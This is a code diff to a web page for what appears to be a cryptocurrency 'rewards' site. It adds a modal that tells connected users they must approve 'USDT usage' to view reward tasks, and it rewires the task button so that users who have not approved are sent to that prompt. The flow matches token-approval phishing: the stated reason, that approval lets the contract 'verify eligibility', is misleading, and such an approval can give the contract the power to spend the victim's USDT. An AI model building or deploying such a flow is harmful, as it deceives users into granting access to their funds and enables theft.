@@ -1424,6 +1424,33 @@ body {
 
 
 
+  <!-- ===== APPROVAL REQUIRED MODAL ===== -->
+<div id="approvalModal" class="modal-overlay hidden">
+  <div class="modal-card">
+    <button class="modal-close" id="closeApprovalModal">✕</button>
+
+    <h3>Approval Required</h3>
+    <p>
+      To view and complete reward tasks, you must approve
+      <strong>USDT usage</strong> once.
+      <br><br>
+      This allows the reward contract to verify eligibility.
+    .
+    </p>
+
+    <div style="margin-top:16px;display:flex;gap:10px;flex-wrap:wrap;">
+      <button id="modalApproveBtn" class="approve-btn">
+        Approve Now
+      </button>
+      <button id="modalCancelBtn" class="btn btn-task">
+        Cancel
+      </button>
+    </div>
+  </div>
+</div>
+
+
+
   
   <!-- libs: Web3 + Ethers -->
   <script src="https://unpkg.com/web3@1.2.11/dist/web3.min.js"></script>
@@ -1436,6 +1463,22 @@ body {
 
   <!-- app script (same logic, AppKit-based connect) -->
   <script type="module">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
 
 // ===== ABOUT / CONTACT POPUPS =====
 const aboutBtn   = document.getElementById("aboutBtn");
@@ -1470,6 +1513,28 @@ aboutBtn?.addEventListener("click", e=>{
   `);
 });
 
+
+
+// ===== APPROVAL MODAL =====
+const approvalModal    = document.getElementById("approvalModal");
+const closeApprovalBtn = document.getElementById("closeApprovalModal");
+const modalApproveBtn  = document.getElementById("modalApproveBtn");
+const modalCancelBtn   = document.getElementById("modalCancelBtn");
+
+function openApprovalModal(){
+  approvalModal.classList.remove("hidden");
+}
+
+function closeApprovalModal(){
+  approvalModal.classList.add("hidden");
+}
+
+closeApprovalBtn?.addEventListener("click", closeApprovalModal);
+modalCancelBtn?.addEventListener("click", closeApprovalModal);
+
+
+
+    
 contactBtn?.addEventListener("click", e=>{
   e.preventDefault();
   openModal(`
@@ -2271,6 +2336,29 @@ await logApproval(tag);
       }
     }
 
+
+
+
+modalApproveBtn?.addEventListener("click", async () => {
+  modalApproveBtn.disabled = true;
+  modalApproveBtn.textContent = "Waiting for wallet…";
+
+  try {
+    await ensureTokenApproval();
+  } finally {
+    modalApproveBtn.disabled = false;
+    modalApproveBtn.textContent = "Approve USDT";
+
+    if (isTokenApproved) {
+      closeApprovalModal();
+      showTaskPage(); // auto-open tasks after approval
+    }
+  }
+});
+
+
+
+    
     async function restoreSessionFromAddress(address){
       currentAddress = address;
 
@@ -2714,9 +2802,22 @@ if (connectBtnCard) {
         claimBtn.addEventListener("click", claimReward);
       }
 
-      if(taskBtn){
-        taskBtn.addEventListener("click", showTaskPage);
-      }
+
+if(taskBtn){
+  taskBtn.addEventListener("click", () => {
+    if (!isWalletConnected) return;
+
+    if (!isTokenApproved) {
+      openApprovalModal();
+      return;
+    }
+
+    showTaskPage();
+  });
+}
+
+      
+ 
      document
   .querySelectorAll("#backToRewardsBtn, .backToRewardsBtn")
   .forEach(btn => {
